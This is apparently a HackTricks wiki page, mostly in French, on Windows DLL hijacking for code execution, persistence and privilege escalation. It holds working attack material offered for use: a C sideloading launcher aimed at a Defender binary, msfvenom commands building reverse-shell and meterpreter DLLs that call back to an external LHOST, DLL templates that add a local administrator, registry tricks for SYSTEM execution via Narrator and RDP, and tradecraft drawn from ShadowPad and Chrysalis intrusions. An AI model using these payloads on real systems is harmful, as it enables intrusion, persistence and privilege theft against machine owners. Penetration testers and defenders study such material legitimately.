# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informations de base

DLL Hijacking implique de manipuler une application de confiance pour qu'elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme **DLL Spoofing, Injection, and Side-Loading**. Il est principalement utilisé pour l'exécution de code, l'obtention de persistance et, moins couramment, l'escalade de privilèges. Malgré l'accent mis ici sur l'escalade, la méthode de hijacking reste la même selon l'objectif.

### Techniques communes

Plusieurs méthodes sont employées pour le DLL hijacking, chacune ayant son efficacité en fonction de la stratégie de chargement de DLL de l'application :

1. **DLL Replacement** : Échanger une DLL légitime par une malveillante, en utilisant éventuellement **DLL Proxying** pour préserver la fonctionnalité de la DLL originale.
2. **DLL Search Order Hijacking** : Placer la DLL malveillante dans un chemin de recherche prioritaire par rapport à la DLL légitime, exploitant le schéma de recherche de l'application.
3. **Phantom DLL Hijacking** : Créer une DLL malveillante que l'application chargera, pensant qu'il s'agit d'une DLL requise qui n'existe pas.
4. **DLL Redirection** : Modifier les paramètres de recherche comme `%PATH%` ou les fichiers `.exe.manifest` / `.exe.local` pour diriger l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : Remplacer la DLL légitime par une contrepartie malveillante dans le répertoire WinSxS, méthode souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking** : Placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, ressemblant aux techniques de Binary Proxy Execution.

> [!TIP]
> Pour une chaîne étape par étape qui superpose du staging HTML, des configs AES-CTR et des implants .NET au-dessus du DLL sideloading, consultez le workflow ci-dessous.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Trouver des DLL manquantes

La manière la plus courante de trouver des DLL manquantes sur un système est d'exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en définissant les 2 filtres suivants :

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

et n'afficher que la **File System Activity** :

![](<../../../images/image (153).png>)

Si vous recherchez des **missing dlls in general** vous **leave** this running for some **seconds**.\
Si vous recherchez une **missing dll inside an specific executable** vous devez définir **un autre filtre comme "Process Name" "contains" `<exec name>`, exécuter l'exécutable, puis arrêter la capture d'événements**.

## Exploitation des DLL manquantes

Pour escalader les privilèges, la meilleure opportunité est de pouvoir **écrire une dll qu'un processus privilégié tentera de charger** dans un des **emplacements où elle sera recherchée**. Ainsi, nous pourrons **écrire** une dll dans un **dossier** où la **dll est recherchée avant** le dossier contenant la **dll originale** (cas rare), ou nous pourrons **écrire dans un dossier où la dll sera recherchée** alors que la **dll originale n'existe** dans aucun dossier.

### Ordre de recherche des DLL

**Dans la** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez trouver comment les Dlls sont chargées spécifiquement.**

Les applications Windows recherchent les DLL en suivant un ensemble de chemins de recherche prédéfinis, respectant une séquence particulière. Le problème de DLL hijacking survient lorsqu'une DLL malveillante est stratégiquement placée dans l'un de ces répertoires, garantissant qu'elle soit chargée avant la DLL authentique. Une solution pour empêcher cela est de s'assurer que l'application utilise des chemins absolus lorsqu'elle référence les DLL dont elle a besoin.

Vous pouvez voir l'ordre de recherche des DLL sur les systèmes 32 bits ci-dessous :

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire.(_C:\Windows\System32_)
3. Le répertoire système 16 bits. Il n'existe pas de fonction pour obtenir le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
1. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires listés dans la variable d'environnement PATH. Notez que cela n'inclut pas le chemin par application spécifié par la clé de registre **App Paths**. La clé **App Paths** n'est pas utilisée lors du calcul du chemin de recherche des DLL.

Ceci est l'ordre de recherche **par défaut** avec **SafeDllSearchMode** activé. Lorsqu'il est désactivé, le répertoire courant remonte à la deuxième place. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la sur 0 (par défaut activé).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, notez qu'une dll peut être chargée en indiquant le chemin absolu plutôt que seulement le nom. Dans ce cas, cette dll ne sera recherchée que dans ce chemin (si la dll a des dépendances, elles seront recherchées comme si elles étaient chargées par nom).

Il existe d'autres façons d'altérer l'ordre de recherche mais je ne vais pas les expliquer ici.

### Forcer le sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une méthode avancée pour influencer de manière déterministe le chemin de recherche des DLL d'un processus nouvellement créé est de définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les API natives de ntdll. En fournissant ici un répertoire contrôlé par l'attaquant, un processus cible qui résout une DLL importée par nom (pas de chemin absolu et sans utiliser les flags de chargement sécurisé) peut être forcé à charger une DLL malveillante depuis ce répertoire.

Idée clé
- Construire les paramètres du processus avec RtlCreateProcessParametersEx et fournir un DllPath personnalisé pointant vers votre dossier contrôlé (par ex., le répertoire où résident votre dropper/unpacker).
- Créer le processus avec RtlCreateUserProcess. Lorsque le binaire cible résout une DLL par nom, le loader consultera ce DllPath fourni pendant la résolution, permettant un sideloading fiable même lorsque la DLL malveillante n'est pas colocée avec l'EXE cible.

Remarques/limitations
- Cela affecte le processus enfant créé ; c'est différent de SetDllDirectory, qui n'affecte que le processus courant.
- La cible doit importer ou appeler LoadLibrary sur une DLL par son nom (pas de chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs et les chemins absolus codés en dur ne peuvent pas être détournés. Les exports forwardés et SxS peuvent modifier la priorité.

Exemple C minimal (ntdll, chaînes wide, gestion d'erreurs simplifiée) :

<details>
<summary>Exemple C complet : forcer le sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemple d'utilisation opérationnelle
- Placez un xmllite.dll malveillant (exportant les fonctions requises ou servant de proxy vers le réel) dans votre répertoire DllPath.
- Lancez un binaire signé connu pour rechercher xmllite.dll par nom en utilisant la technique ci-dessus. Le loader résout l'import via le DllPath fourni et sideloads votre DLL.

Cette technique a été observée in-the-wild pour entraîner des chaînes de sideloading multi-étapes : un lanceur initial dépose une DLL d'assistance, qui ensuite lance un binaire signé par Microsoft, hijackable, avec un DllPath personnalisé pour forcer le chargement de la DLL de l'attaquant depuis un répertoire de staging.


#### Exceptions à l'ordre de recherche des DLL d'après la documentation Windows

Certaines exceptions à l'ordre de recherche standard des DLL sont notées dans la documentation Windows :

- Lorsqu'une **DLL qui partage son nom avec une autre déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. Au lieu de cela, il effectue une vérification de redirection et un manifest avant de revenir à la DLL déjà en mémoire. **Dans ce scénario, le système n'effectue pas de recherche pour la DLL**.
- Dans les cas où la DLL est reconnue comme une **known DLL** pour la version actuelle de Windows, le système utilisera sa version de la known DLL, ainsi que toutes ses DLL dépendantes, **en renonçant au processus de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient la liste de ces known DLLs.
- Si une **DLL a des dépendances**, la recherche de ces DLL dépendantes est effectuée comme si elles étaient indiquées uniquement par leurs **noms de module**, indépendamment du fait que la DLL initiale ait été identifiée via un chemin complet.

### Escalade de privilèges

**Prérequis**:

- Identifiez un processus qui s'exécute ou s'exécutera avec des **privilèges différents** (mouvement horizontal ou latéral), et qui **ne dispose pas d'une DLL**.
- Assurez-vous qu'un **accès en écriture** est disponible sur tout **répertoire** dans lequel la **DLL** sera **recherchée**. Cet emplacement peut être le répertoire de l'exécutable ou un répertoire dans le chemin système.

Oui, les prérequis sont compliqués à trouver car **par défaut, il est plutôt étrange de trouver un exécutable privilégié qui manque une dll** et il est encore **plus étrange d'avoir des permissions en écriture sur un dossier du chemin système** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés, cela est possible.\
Dans le cas où vous avez de la chance et que vous remplissez les conditions, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si **le but principal du projet est de bypass UAC**, vous pourriez y trouver un **PoC** de Dll hijacking pour la version de Windows que vous utilisez (probablement en changeant simplement le chemin du dossier où vous avez des permissions en écriture).

Notez que vous pouvez **vérifier vos permissions dans un dossier** en faisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers dans PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d'un exécutable et les exports d'une dll avec :
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur comment **abuse Dll Hijacking to escalate privileges** avec des permissions d'écriture dans un **System Path folder** consultez :


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d'écriture sur un quelconque dossier dans le system PATH.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les fonctions **PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll_.

### Exemple

Dans le cas où vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès est de **créer une dll qui exporte au moins toutes les fonctions que l'exécutable importera depuis elle**. Notez que Dll Hijacking est utile pour [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou pour [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer une dll valide** dans cette étude sur le dll hijacking axée sur l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante** vous pouvez trouver des **codes dll basiques** qui peuvent être utiles comme **templates** ou pour créer une **dll avec des fonctions non requises exportées**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Fondamentalement, un **Dll proxy** est une Dll capable d'**exécuter votre code malveillant lorsqu'elle est chargée** mais aussi d'**exposer** et de **fonctionner** comme prévu en **relayant tous les appels vers la bibliothèque réelle**.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) vous pouvez effectivement **indiquer un exécutable et sélectionner la bibliothèque** que vous souhaitez proxifier et **générer une dll proxifiée** ou **indiquer la Dll** et **générer une dll proxifiée**.

### **Meterpreter**

**Obtenir un rev shell (x64) :**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86 je n'ai pas vu de version x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre

Notez que, dans plusieurs cas, la Dll que vous compilez doit **export several functions** qui seront chargées par le processus victime. Si ces fonctions n'existent pas, le **binary won't be able to load** them et le **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemple de DLL C++ avec création d'utilisateur</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternatif avec point d'entrée de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Étude de cas : Narrator OneCore TTS localisation DLL Hijack (Accessibility/ATs)

Windows Narrator.exe recherche encore au démarrage une DLL de localisation prédictible et spécifique à la langue qui peut être détournée pour permettre l'exécution de code arbitraire et la persistance.

Faits clés
- Chemin sondé (versions actuelles) : `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Chemin hérité (anciennes versions) : `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL contrôlée par l'attaquant et accessible en écriture existe au chemin OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` s'exécute. Aucun export n'est requis.

Découverte avec Procmon
- Filtre : `Process Name is Narrator.exe` et `Operation is Load Image` ou `CreateFile`.
- Lancez Narrator et observez la tentative de chargement du chemin ci‑dessus.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silence OPSEC
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flux d'attaque

1. En tant qu'utilisateur standard, déposer `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendre que la tâche planifiée s'exécute à 9h30 dans le contexte de l'utilisateur courant.
3. Si un administrateur est connecté lorsque la tâche s'exécute, le DLL malveillant s'exécute dans la session de l'administrateur à medium integrity.
4. Enchaîner des techniques standard UAC bypass pour élever de medium integrity aux privilèges SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Les acteurs malveillants associent souvent des droppers basés sur MSI avec DLL side-loading pour exécuter des payloads sous un processus signé et de confiance.

Aperçu de la chaîne
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading pratique avec wsc_proxy.exe
- Déposez ces deux fichiers dans le même dossier :
- wsc_proxy.exe : hôte légitime signé (Avast). Le processus tente de charger wsc.dll par nom depuis son répertoire.
- wsc.dll : attacker DLL. Si aucun export spécifique n'est requis, DllMain peut suffire ; sinon, créez un proxy DLL et transférez les exports requis vers la bibliothèque légitime tout en exécutant le payload dans DllMain.
- Créez un payload DLL minimal :
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Pour les exigences d'exportation, utilisez un framework de proxy (p.ex., DLLirant/Spartacus) pour générer un DLL de redirection qui exécute aussi votre payload.

- Cette technique dépend de la résolution du nom de DLL par le binaire hôte. Si l'hôte utilise des chemins absolus ou des flags de chargement sûrs (p.ex., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS, and forwarded exports peuvent influencer la priorité et doivent être pris en compte lors de la sélection du binaire hôte et de l'ensemble d'exports.

## Triades signées + payloads chiffrés (étude de cas ShadowPad)

Check Point a décrit comment Ink Dragon déploie ShadowPad en utilisant une **triade de trois fichiers** pour se fondre dans des logiciels légitimes tout en gardant le payload principal chiffré sur disque :

1. **EXE hôte signé** – des fournisseurs tels que AMD, Realtek, ou NVIDIA sont abusés (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Les attaquants renomment l'exécutable pour qu'il ressemble à un binaire Windows (par exemple `conhost.exe`), mais la signature Authenticode reste valide.
2. **Malicious loader DLL** – déposée à côté de l'EXE avec un nom attendu (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Le DLL est généralement un binaire MFC obfusqué avec le framework ScatterBrain ; son seul rôle est de localiser le blob chiffré, le déchiffrer, et mapper ShadowPad de façon réflexive.
3. **Encrypted payload blob** – souvent stocké comme `<name>.tmp` dans le même répertoire. Après avoir mappé en mémoire le payload déchiffré, le loader supprime le fichier TMP pour effacer les traces forensiques.

Tradecraft notes:

* Renommer l'EXE signé (tout en conservant le `OriginalFileName` original dans l'en-tête PE) lui permet de se faire passer pour un binaire Windows tout en conservant la signature du fournisseur ; donc reproduisez l'habitude d'Ink Dragon de déposer des binaires ressemblant à `conhost.exe` qui sont en réalité des utilitaires AMD/NVIDIA.
* Parce que l'exécutable reste approuvé, la plupart des contrôles d'allowlisting nécessitent seulement que votre DLL malveillant soit à côté. Concentrez-vous sur la personnalisation du loader DLL ; le parent signé peut généralement s'exécuter sans modification.
* Le déchiffreur de ShadowPad s'attend à ce que le blob TMP vive à côté du loader et soit inscriptible pour pouvoir mettre le fichier à zéro après mapping. Gardez le répertoire inscriptible jusqu'au chargement du payload ; une fois en mémoire, le fichier TMP peut être supprimé en toute sécurité pour l'OPSEC.

## Étude de cas : NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Une intrusion récente de Lotus Blossom a abusé d'une chaîne de mise à jour de confiance pour livrer un dropper packagé avec NSIS qui a orchestré un DLL sideload plus des payloads entièrement en mémoire.

Tradecraft flow
- `update.exe` (NSIS) crée `%AppData%\Bluetooth`, le marque **HIDDEN**, dépose un Bitdefender Submission Wizard renommé `BluetoothService.exe`, un `log.dll` malveillant, et un blob chiffré `BluetoothService`, puis lance l'EXE.
- L'EXE hôte importe `log.dll` et appelle `LogInit`/`LogWrite`. `LogInit` charge le blob via mmap ; `LogWrite` le déchiffre avec un flux personnalisé basé sur LCG (constantes **0x19660D** / **0x3C6EF35F**, matériau de clé dérivé d'un hash précédent), écrase le buffer avec le shellcode en clair, libère les temporaires, puis y saute.
- Pour éviter un IAT, le loader résout les APIs en hachant les noms d'export avec **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, puis en appliquant une avalanche de style Murmur (**0x85EBCA6B**) et en comparant aux hash cibles salés.

Main shellcode (Chrysalis)
- Déchiffre un module principal de type PE en répétant add/XOR/sub avec la clé `gQ2JR&9;` sur cinq passes, puis charge dynamiquement `Kernel32.dll` → `GetProcAddress` pour finir la résolution des imports.
- Reconstruit les chaînes de noms de DLL à l'exécution via des transforms bit-rotate/XOR par caractère, puis charge `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utilise un second resolver qui parcourt le **PEB → InMemoryOrderModuleList**, parse chaque table d'exports en blocs de 4 octets avec mixage de style Murmur, et ne revient à `GetProcAddress` que si le hash n'est pas trouvé.

Embedded configuration & C2
- La config se trouve dans le fichier `BluetoothService` déposé à **offset 0x30808** (taille **0x980**) et est déchiffrée en RC4 avec la clé `qwhvb^435h&*7`, révélant l'URL C2 et le User-Agent.
- Les beacons construisent un profil d'hôte délimité par des points, préfixent le tag `4Q`, puis encryptent en RC4 avec la clé `vAuig34%^325hGV` avant `HttpSendRequestA` via HTTPS. Les réponses sont décryptées en RC4 et dispatchées par un switch de tags (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Le mode d'exécution est contrôlé par les args CLI : pas d'args = installer la persistance (service/Run key) pointant vers `-i` ; `-i` relance le binaire avec `-k` ; `-k` saute l'installation et exécute le payload.

Alternate loader observed
- La même intrusion a déployé Tiny C Compiler et exécuté `svchost.exe -nostdlib -run conf.c` depuis `C:\ProgramData\USOShared\`, avec `libtcc.dll` à côté. Le source C fourni par l'attaquant contenait le shellcode, a été compilé et exécuté en mémoire sans toucher au disque sous forme de PE. Répliquer avec:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Cette étape compile-and-run basée sur TCC a importé `Wininet.dll` à l'exécution et a récupéré un shellcode de deuxième étape depuis une URL codée en dur, fournissant un loader flexible qui se fait passer pour une exécution de compilateur.

## Références

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
